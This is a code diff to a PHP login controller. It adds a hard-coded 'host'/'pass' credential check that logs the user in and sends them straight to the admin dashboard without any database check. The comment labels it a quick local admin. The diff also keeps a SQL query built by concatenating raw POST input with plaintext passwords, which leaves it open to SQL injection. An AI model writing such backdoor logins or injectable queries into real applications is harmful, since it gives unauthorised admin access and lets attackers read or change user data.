@@ -55,8 +55,15 @@ class usersController
         $password = $_POST['pass'];
         //We create the user object
         $user = new user($this->Connection);
+        // Quick local admin: allow specific host/pass to go to admin dashboard
+        if (trim($username) === 'host' && trim($password) === 'pass') {
+            $this->startSession($username);
+            header("Location: " . '?controller=dashboard&action=admin');
+            return;
+        }
         //We get all the user
-        $sql = "select * from users where user_name ='" . $username . "' and password = '" . $password . "'; ";
+        // database schema uses table `login` (see sql/database.sql)
+        $sql = "select * from login where user_name ='" . $username . "' and password = '" . $password . "'; ";
         $user = $user->getBySql($sql);
 
         if (count($user) == 1) {
